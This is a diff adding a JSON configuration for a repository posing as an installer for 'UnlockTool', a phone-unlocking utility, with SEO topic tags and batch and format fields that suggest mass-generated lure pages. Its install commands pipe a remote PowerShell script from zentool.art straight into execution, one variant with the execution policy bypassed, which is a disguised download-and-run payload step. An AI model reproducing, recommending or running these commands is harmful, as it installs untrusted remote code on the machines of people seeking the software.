@@ -1,0 +1,33 @@
+{
+  "repo": "UnlockTool-GSM-Setup",
+  "product": "UnlockTool-GSM-Setup",
+  "product_title": "UnlockTool",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_url": "https://zentool.art/",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "health_url": "https://zentool.art/health",
+  "batch": "fat-seo-no-year",
+  "format": "license-md-geogit-v5-paraphrase-seo",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "unlocktool",
+    "unlocktool-gsm",
+    "mobile-flashing",
+    "device-service",
+    "firmware-tools",
+    "android-tools",
+    "phone-service",
+    "usb-diagnostics",
+    "handset-repair",
+    "service-software",
+    "complete-version",
+    "download",
+    "full-installer",
+    "windows-11",
+    "windows-software"
+  ],
+  "site": "zentool.art"
+}
